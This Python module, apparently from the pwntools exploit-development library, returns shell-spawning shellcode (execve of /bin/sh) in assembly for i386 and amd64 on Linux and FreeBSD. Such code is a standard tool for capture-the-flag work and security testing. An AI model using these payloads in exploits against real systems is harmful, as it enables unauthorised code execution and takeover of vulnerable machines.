from pwn.internal.shellcode_helper import *

@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'])
def sh(arch = None, os = None):
    """Spawn a shell."""

    if arch == 'i386':
        if os == 'linux':
            return _sh_linux_i386()
        elif os == 'freebsd':
            return _sh_freebsd_i386()
    elif arch == 'amd64':
        if os == 'linux':
            return _sh_linux_amd64()
        elif os == 'freebsd':
            return _sh_freebsd_amd64()

    bug('OS/arch combination (%s,%s) is not supported' % (os,arch))

def _sh_freebsd_i386():
    return """
        xor eax, eax
        push eax
        push `//sh`
        push `/bin`
        mov ecx, esp

        ; execve("/bin//sh", {junk, 0}, {0});
        push eax
        push esp
        push esp
        push ecx
        push eax
        mov al, SYS_execve
        int 0x80
"""

def _sh_linux_i386():
    return """
        ;; Clear eax, ecx, edx
        xor ecx, ecx
        imul ecx

        ;; Push '/bin//sh'
        push eax
        push `//sh`
        push `/bin`

        ;; Call execve("/bin//sh", 0, 0)
        mov al, SYS_execve
        mov ebx, esp
        int 0x80
"""

def _sh_linux_amd64():
    return """
        mov rax, '/bin//sh'

        ;; clear rdx and rsi
        cdq
        mov esi, edx

        ;; push '/bin//sh\\0'
        push rdx
        push rax

        ;; Call execve("/bin//sh", 0, 0)
        mov rdi, rsp
        push SYS64_execve
        pop rax
        syscall
"""

def _sh_freebsd_amd64():
    return """
        mov rax, '/bin//sh'

        ;; clear rdx
        cdq

        ;; push '/bin//sh\\0'
        push rdx
        push rax

        ;; Setup argv[0]
        mov rdi, rsp

        ;; Setup argv + envp
        push rdx
        mov rdx, rsp
        push rdi
        mov rsi, rsp

        ;; Call execve("/bin//sh", {"/bin//sh", 0}, {0})
        push SYS64_execve
        pop rax
        syscall
"""
